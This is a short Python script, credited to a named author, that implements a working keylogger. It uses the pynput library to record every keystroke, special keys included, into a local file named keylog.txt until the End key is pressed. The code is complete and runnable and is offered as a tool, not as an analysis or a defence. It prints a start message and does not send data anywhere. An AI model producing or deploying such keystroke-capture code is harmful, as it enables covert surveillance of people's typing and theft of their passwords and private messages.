"""
Keylogger
Author: [Philipp Bielinski]
Description: This script logs keystrokes from the user and writes them to a file.
"""

from pynput import keyboard

# Define a flag to control when to stop the listener
stop_flag = False

def on_key_press(key):
    """
    Callback function to handle key press events.
    Args:
        key: The pressed key.
    """
    global stop_flag

    # Write the pressed key to the log file
    with open("keylog.txt", 'a') as log_file:
        try:
            char = key.char
            log_file.write(char)
        except AttributeError:
            # Non-character keys
            log_file.write(f' [{key}] ')

    # Check if the "End" key is pressed to stop the logger
    if key == keyboard.Key.end:
        stop_flag = True
        return False  # Stop the listener

def main():
    """
    Main function to start the keylogger.
    """
    print("Starting Keylogger. Press 'End' key to stop.")

    # Start the listener
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

    try:
        # Keep the listener running until "End" key is pressed
        listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")

if __name__ == "__main__":
    main()
